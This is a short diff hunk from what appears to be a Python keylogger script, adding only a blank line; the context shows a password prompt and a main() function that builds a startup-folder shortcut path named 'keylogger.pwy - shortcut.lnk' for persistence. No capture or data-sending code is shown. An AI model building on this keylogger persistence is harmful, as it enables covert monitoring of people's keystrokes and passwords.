@@ -41,6 +41,7 @@ password_get =input("enter password")
 # print(password)
 # method for creating shortcut file in startup folder
 
+
 def main():
     path = os.path.join(destination, "keylogger.pwy - shortcut.lnk")
 
